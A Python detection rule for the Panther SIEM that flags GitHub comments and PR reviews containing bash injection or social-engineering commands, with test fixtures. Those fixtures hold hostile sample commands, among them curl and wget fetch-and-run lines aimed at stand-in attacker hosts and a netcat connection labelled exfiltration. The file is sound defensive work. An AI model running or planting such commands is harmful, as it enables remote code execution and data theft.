from pypanther import LogType, Rule, RuleTest, Severity, panther_managed
from pypanther.helpers.github import (
    contains_bash_injection_pattern,
    get_matched_bash_patterns,
    github_reference_url,
    github_webhook_alert_context,
)


@panther_managed
class GitHubWebhookMaliciousCommentContent(Rule):
    id = "GitHub.Webhook.MaliciousCommentContent-prototype"
    display_name = "GitHub Malicious Comment/Review Content"
    log_types = [LogType.GITHUB_WEBHOOK]
    reports = {"MITRE ATT&CK": ["TA0001:T1195.002", "TA0042:T1566"]}
    tags = ["Code Injection", "Supply Chain", "Social Engineering"]
    default_severity = Severity.MEDIUM
    default_description = "Detects malicious patterns in GitHub comment and review content that could indicate bash injection attempts or social engineering attacks. This includes comments on issues, pull requests, and pull request reviews. While comments cannot directly execute code, they can be used to trick developers into running malicious commands. This rule detects command substitution patterns similar to those found in the Nx vulnerability (GHSA-cxm3-wv7p-598c).\n"
    default_runbook = "1. Review the comment or review content for malicious patterns\n2. Check the author's profile and activity history\n3. Determine if this is a legitimate comment or a social engineering attempt\n4. Delete the comment/review if it's malicious\n5. Report the user if they appear to be intentionally posting malicious content\n6. Review other comments from the same user in the repository\n7. Consider blocking the user from the repository/organization\n8. Check if any developers may have already executed the malicious commands\n"
    default_reference = "https://github.com/nrwl/nx/security/advisories/GHSA-cxm3-wv7p-598c"

    def rule(self, event):
        # Check for comment/review events
        action = event.get("action")
        # Handle issue_comment events (comments on issues or PRs)
        if event.get("comment") and action in ["created", "edited"]:
            if contains_bash_injection_pattern(event.deep_get("comment", "body")):
                return True
        # Handle pull_request_review events
        if event.get("review") and action in ["submitted", "edited"]:
            if contains_bash_injection_pattern(event.deep_get("review", "body")):
                return True
        return False

    def title(self, event):
        repo_name = event.deep_get("repository", "full_name", default="<UNKNOWN_REPO>")
        action = event.get("action", "<UNKNOWN_ACTION>")
        # Determine if this is a comment or review
        if event.get("comment"):
            comment_id = event.deep_get("comment", "id", default="<UNKNOWN>")
            comment_type = "PR comment" if event.get("pull_request") else "issue comment"
            return f"Malicious pattern detected in {comment_type} #{comment_id} in {repo_name} ({action})"
        if event.get("review"):
            review_id = event.deep_get("review", "id", default="<UNKNOWN>")
            return f"Malicious pattern detected in PR review #{review_id} in {repo_name} ({action})"
        return f"Malicious pattern detected in comment/review in {repo_name} ({action})"

    def alert_context(self, event):
        context = github_webhook_alert_context(event)
        # Analyze comment body
        if comment_body := event.deep_get("comment", "body"):
            patterns = get_matched_bash_patterns(comment_body)
            if patterns:
                comment = event.get("comment", {})
                context["comment_analysis"] = {
                    "body": comment_body,
                    "matched_patterns": patterns,
                    "comment_id": comment.get("id"),
                    "user": comment.get("user", {}).get("login"),
                    "html_url": comment.get("html_url"),
                    "created_at": comment.get("created_at"),
                    "updated_at": comment.get("updated_at"),
                }
        # Analyze review body
        if review_body := event.deep_get("review", "body"):
            patterns = get_matched_bash_patterns(review_body)
            if patterns:
                review = event.get("review", {})
                context["review_analysis"] = {
                    "body": review_body,
                    "matched_patterns": patterns,
                    "review_id": review.get("id"),
                    "user": review.get("user", {}).get("login"),
                    "state": review.get("state"),
                    "html_url": review.get("html_url"),
                    "submitted_at": review.get("submitted_at"),
                }
        return context

    def reference(self, event):
        # Try to get comment or review URL
        if comment_url := event.deep_get("comment", "html_url"):
            return comment_url
        if review_url := event.deep_get("review", "html_url"):
            return review_url
        if reference_url := github_reference_url(event):
            return reference_url
        return "DEFAULT"

    tests = [
        RuleTest(
            name="Issue Comment with Command Substitution",
            expected_result=True,
            log={
                "action": "created",
                "comment": {
                    "id": 123456,
                    "body": "Try running this command: $(curl evil.com/payload.sh)",
                    "user": {"login": "malicious-user", "id": 12345, "type": "User"},
                    "html_url": "https://github.com/org/repo/issues/1#issuecomment-123456",
                    "created_at": "2024-01-15T10:30:00Z",
                },
                "issue": {"number": 1, "title": "Help needed"},
                "repository": {"name": "repo", "full_name": "org/repo"},
                "sender": {"login": "malicious-user"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="PR Comment with Backtick Command",
            expected_result=True,
            log={
                "action": "created",
                "comment": {
                    "id": 789012,
                    "body": "Can you test with: `wget attacker.com/malware | bash`",
                    "user": {"login": "attacker"},
                    "html_url": "https://github.com/org/repo/pull/5#issuecomment-789012",
                },
                "pull_request": {"number": 5, "title": "New feature"},
                "repository": {"full_name": "org/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="PR Review with Shell Command",
            expected_result=True,
            log={
                "action": "submitted",
                "review": {
                    "id": 345678,
                    "body": "Looks good! Run /bin/bash -c 'malicious payload' to test",
                    "state": "approved",
                    "user": {"login": "fake-reviewer"},
                    "html_url": "https://github.com/org/repo/pull/10#pullrequestreview-345678",
                    "submitted_at": "2024-01-15T11:00:00Z",
                },
                "pull_request": {"number": 10, "title": "Bug fix"},
                "repository": {"full_name": "org/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Edited Comment with Eval Pattern",
            expected_result=True,
            log={
                "action": "edited",
                "comment": {"id": 999888, "body": "Updated: eval($malicious_var)", "user": {"login": "suspicious"}},
                "issue": {"number": 50},
                "repository": {"full_name": "target/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Normal Comment",
            expected_result=False,
            log={
                "action": "created",
                "comment": {
                    "id": 111222,
                    "body": "Thanks for the contribution! This looks great.",
                    "user": {"login": "legitimate-reviewer"},
                },
                "pull_request": {"number": 25},
                "repository": {"full_name": "org/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Review with Code Snippet (Normal)",
            expected_result=False,
            log={
                "action": "submitted",
                "review": {
                    "id": 555666,
                    "body": "Please update the function to handle edge cases better",
                    "state": "changes_requested",
                    "user": {"login": "senior-dev"},
                },
                "pull_request": {"number": 30},
                "repository": {"full_name": "org/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Non-Comment Event",
            expected_result=False,
            log={
                "action": "push",
                "ref": "refs/heads/main",
                "repository": {"full_name": "org/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Comment with Netcat Exfiltration",
            expected_result=True,
            log={
                "action": "created",
                "comment": {"id": 777888, "body": "Debug with: nc 1.2.3.4 4444", "user": {"login": "attacker"}},
                "issue": {"number": 100},
                "repository": {"full_name": "victim/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Comment with Benign Inline Code",
            expected_result=False,
            log={
                "action": "created",
                "comment": {
                    "id": 888999,
                    "body": "You can use `npm install` to install the dependencies",
                    "user": {"login": "helpful-dev"},
                },
                "issue": {"number": 101},
                "repository": {"full_name": "org/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Review with Benign Inline Code",
            expected_result=False,
            log={
                "action": "submitted",
                "review": {
                    "id": 999000,
                    "body": "Please run `make test` before submitting",
                    "state": "changes_requested",
                    "user": {"login": "reviewer"},
                },
                "pull_request": {"number": 102},
                "repository": {"full_name": "org/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
    ]
